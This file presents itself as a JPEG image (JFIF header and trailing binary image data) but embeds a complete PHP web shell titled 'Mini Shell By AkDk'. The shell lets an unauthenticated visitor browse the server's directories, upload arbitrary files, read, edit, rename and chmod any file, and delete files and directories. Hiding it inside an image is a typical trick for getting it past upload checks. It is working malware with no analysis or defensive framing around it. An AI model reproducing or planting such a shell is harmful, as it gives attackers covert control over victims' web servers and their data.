���� JFIF   d d  �� Ducky     d  �� Adobe d�   �� � ��'�
<?
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css">
<title>Mini Shell By AkDk</title>
<style>
body{
font-family: "Orbitron";
background-color: #58FC8C;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: #636263;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: silver;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Orbitron";
}
a{
color: #000;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<H1><center><img width=33 height=44 src="http://www.sherv.net/cm/emoticons/hello/rude-greetings-smiley-emoticon.gif">
 Mini shell by Devil Killer <img width=33 height=44 src="http://www.sherv.net/cm/emoticons/hello/rude-greetings-smiley-emoticon.gif">
 </center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Direktori : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">File uploaded successfully!</font><br />';
}else{
echo '<font color="red">Upload failed! Fuck! <img src="http://c.fastcompany.net/asset_files/-/2014/11/11/4F4.gif"/>
 </font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Done.</font><br />';
}else{
echo '<font color="red">Change Permission Error.</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Change Name Done.</font><br />';
}else{
echo '<font color="red">Change Name Error.</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Done ^_^.</font><br />';
}else{
echo '<font color="red">Edit File Error ~_~.</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Delete Dir Done.</font><br />';
}else{
echo '<font color="red">Delete Dir Error.</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Done.</font><br />';
}else{
echo '<font color="red">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<center><br />Mini shell by <a href="https://www.facebook.com/AkDk123"><font color="red" >AkDk</font></a></center>
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>			��  8 � �� �            	
           	        !	1Q"A2
aq�Bb#s       !1AQa"q�2���bBR��r�S$��   ? ��~�G����������������������A�M QB& P��0� 	�7ԀOH�@�(E D�)�a� ?A�GB� A��"a�!�!�!�"�򉄀b��7���w�}O�d"�D!�!�!�!�"�9DD�b���q@@D����o��G�DU�����������������\�ɫ�=���a�6��9{}����:�W�ʒ>���u	�^BYʮGƣ��!�$L�1�ٝ�Cm�m+�+�G*�T5J��o��P� f�	���f1�ru����A T,�L�9uӺ!'�G6������A�s8q��1Yq��]�F|����u��I7��(�������B�X\Y�^%�֬�nd�J���ν��r<���:����B�23������N��#�(��ɑ�g@�ЅT���o���	����+�N�E!�� &QS�i&P(������@N��ۡJ#����s��H��R�~a Dd�_G��=@��w�;w��N��6V�q�bYY~�G��1&��F0(�2��o�ԋ��?Qh��?Q K�S�2��� �`��d���'��J`���J��i�E��-�%2����d񲀚ɑ�U�C�Q�u�v�5�S:�.T�����*�����>$i8{��v���+	��p��f�d��10���~�8��Ȧ�
�c�P8��7��>�����B�f��[E#ը̪}U�����\�eeal�4i�&��� �!�!3�:j탃4~��{�f�ڸd��s6t�K��?%�u�j���B{�~b5�N�7��[&/��U��	E� 2��1w"�%��l�\�C�� Ҙ�Q�A� |�͢O���8�"��r�5�8��*ɬ����
�G��\�'�b<;c�ń���N.:FQDuӌ`�D�ۀ�Fh�d@C�ݷMpwJ`��y����~q���[���t�l;9�ݓ<�ͦ�*��e+1y�����j&MAl�����b%!�:k�n+�q���W)qNʳ��Ue��YOx"`ǻJ�l��
�56���� ��N_���1�c����N<ű��&އP��(,R�`���C�h�����<Fpe?!�D;����?1�̾R�V��E�$j;<��On�e9	�S�>���KD��N��R{T,峬���kz-�?)��"@0�vˑ.�M�2`M�& ߮�ߛ�r���F���1gSii��~T�K~�"gO�m�{�%�m�}�� dA�"bQ����S.W��di�M����V~�h�6��0�<�מ).(Aæ�&� h"(*(�n'>��|����WU��a]����-�=��1>���f+�7���)����A��:Ϻ ����ff��XӂW��0ˍ�0�~&�Y��%�BS$5��^\�Bc���Հ$vI�E!7�{�s_{Wk��g	��Q��r��Q)�#Mi�Ն�l��z�:N(�9}[������Uŷ�[q}Ŧ��;:�������6)���R�>ق�G�B��37׈�lL�J���BRR�W�l�-b�#���f�Q%���k;d�%mq��T�]���n������;���!���x���Z��/AA�ڂ{�T�S����F<�k�S��Z�-'�o��v�L�2�HX�1��6��:�YԊJ%	%`=5ӧnR�ʮS*��!B��o ��>Gc�(U4,jѴ��B�[�G,�}A}@�����cl�����D.�jdHJE�>��$��z���׽�\���`�\UF��)S�jՋjY5��j�2�=�}@�3�36�al�57�~W�=��q���j�H�[j��=���PEV��A�_�s���ֱ{]���6�z6�����c[�8�����[3�&��!'bؠ(KL��;����u�ɸd��.�Q�	��Q�; ���I��Ys^O^�d�ZX���� ���"�3��%3�4�����X�tp6�Z�n=&��dX����#�>�p%K+q�z��"1�"��ߎVY`jh�*�,�E�ݱ��������c"���erȋ $������9M���k�z7H���:U�eF���hd��K�l)]�)d���ދ��Ϊ�X}@O����f�g��㜂lF\�/x�<��0V�ޤ�F�g�-&z��Ѽ��M
&1�Lp)v׷�!���ŏ�}�*4C��\��(܃����#)�3�oN���]ܨ��BI��t��^�i�ۛ�h�Z{Jݺاnt	Ǎ��Z��̗�}U��������.������QMQLD�,^�]�8��𢩩kK���PHJ��:���z����ș�9%l��}�-g�YI�����I�������La�L8W0��l����4��X���(�f9Y�=��Z�����)�M�Y��§QEJRM���-��n��-~��RAP�SSWm����*�d  f;��+>aF���ef� !~�2��$��j{c�J�f�x���J{
F��8�-��Ƕ��C�U��R��YްH�O+��������2�5�)�>�g��W�_q��Z��7sBIOR�*8t���2�յ�^O����m�h��ý0vڬ�U��-���#N�3�49i��5�R�n��������k�3�h�3��ED<����
��F�f�d@p��p��Uu����\c)�V��+�d�IU�2��5U]�i� ��ݙ�Y��:m-�#� .�$�X�u�fI����%��W9�Y�FԲHrw��� �5`ń��,ުi��oZ92�6���7�T���T�X�>���c*f���f���:�v�J�J4�Γ�C`@��	:�VwKa���.~���@�tiu���2����krc��oa���d�j��QF�u\�@�cDt��q����-���E����� #���j��]����+o�� �����=���Y+/X��3��S��3������ {�����q+�-���n�+��I�v�L��#O!��<65h���bac��bA���c�=���y0M�ڑD4�J'���UOC�`�G1G�9���{B>މ�˵�E�'o�� lk˭��BBB7,�Q!�֮TA��M�6[ͦ*N ��SQ��SP��0��?�K�ju�b�H�[~�� �R7er�$�T� ��$��쁉�a��	+_���r3K�/�h�~�B5>2��1�I��]rq��VI�h��1�?$�l���96��d
�aŹ@@%R��.b��I��{L���\ZJ��Qzj�Sd� �x4���-��%=�G��Ô�g8d3�4��Wq�Z�A}D���i���a�̼���M )�e�Lmj~M����q�mݝ�Ү�]���4'k�m��9�"��B��K+uF���&�騜��IJf#[֞z�y�rӂ���U/"�3r氄[���{-/�of���o;!
������@�$���X���/���9���a��O�U*P�O�RZ�`�A2dA��������֨�֮�$�Q�̳�D�#�@��nr�M��y���W�?�rʛ%g�TM��j��2q~3FŽ�y}�Wwjv��չ�0���`����%���c=*wB;����@ק��|W2|�+Z����$,��.�:	�?���i��0�UK�����F"�i�,�"��Yv��Y���N.I�~��"�Q�f�8D�o�M5��{����ش���
��K�i�'!�FS*@=/�y&*�b�ͽǔ��,�	22�L�����|q{��x�L,���nP��r��Hb~�[�b�*՜FH�L�:N��4ߔ)C�)����\��gsmm����U��tfwR(���*��+�|��W��2x�V�%V��ԁ�@PF�����S�"W=��E��,m�jU���Y�o.g�g\C 7�l�����&�� �c�|�TUT�����i�y�������]����4����f�>���Z�r;jT���7�9o���;��^�����+wț�J�9�f�RFR5յ�k\h��[m�>9US�3�mE+r
�"�����PIj����|��\Qj�����!�S���O�A�='%RL�'����X|,U*��ʚ@,��Seb�@v�^�!��|v�>���Ĝ�����M������Eܝ�%��S�[�H�)J�/��$Yb�1L��80�g=���7wC)`��*�i���+�}���AJ=�\}�2��R��*�n �D���G�.�����'�N)`.ծQ�#Qn|fj�d��Y���j���m�F�v��FnͲKx����"�h�bf���~Q�o��&�aZ�ߜ�ԺJ�'��' ��D��'e��[��8�p�G�'m&V�K���'ԝ43�1x��}�a�k�ܖ��CR�&�,&���wS�u��g;d��`���Y��%�(E,EYw ��y&g�|��O�*�UR�ƞ��d}�q�D�=���.ǘ�Ыkr��`L�]���y۞��-��	jWȋ~CK��@�q�R6FR�Bė���c�=Qm�]�34A`H늫(B�h�u��L�I�\��ұ�:��A�W��JsՂ�bH��31՜���[-*��sn%0J�6]Z]	� ���2�=�ڗ�?�YY�ԕ�yP�~��Z��[C0Y�05_ L��zD������ǋp�8�lw
ᇖq��:HFb�Щ@�"�
��|*(���Iǫ=�l��;��-O��� �z���>�x7�*\��K�ӧ���
v]37̿���YOJ�DrfF8%	v�L|�1E�j��Q����|ƭ\m^/��Vh�(L�Hj�� ���G��:$T9��2֛}���A�Gӱ�����h��$і��9zk����?�#-u��]�M� ���.�T :f�K�w�C[���_�-ڣS?+u2�G�P.(zƉ`�v���u쎘ii�P��UT���UQ���� 4��QDUM�
���L&E�
�0��dVH�U#tܢ��$dA솠�u��U�ʹ��+�
�|�~B����U�7� p��!�t���l�b؀�8�9
�#�E�(C��?�}L� (G%�ǯ�1~���Go�x�裷ǋ�WǷ�v�TO��p�Y��$�L��u�f��3pᓮ���f�f�{:��v�M^ο��`m`
�1��H3�+�z���W ��\,�`)�cruT�P߮�	  x	|�I&gS��?�`��#"�!�&�2H@AM���PȎf�|@?8�̺) xG`�QAꢦ�UC}�*��TΡ� �DG\�%�""�e�3P�2p��j�2p�ET(�Unt�r�~�"�Ĝ<D�p���b� �>�z��q�u?'P㹎q�DDGS�_l��GQVN\�Q`�UFNh���n�N�D��v�"�ʮ$�;��p��H>d 
c�i�qP��:��q��p�����9� z�)� ��Sm�v�1��Q�d *(%�UE1/h�eT2bP�b��A(m��i�I�(  � �@���?Q��>�!!!!!!!!!!!!!!!!!!!!��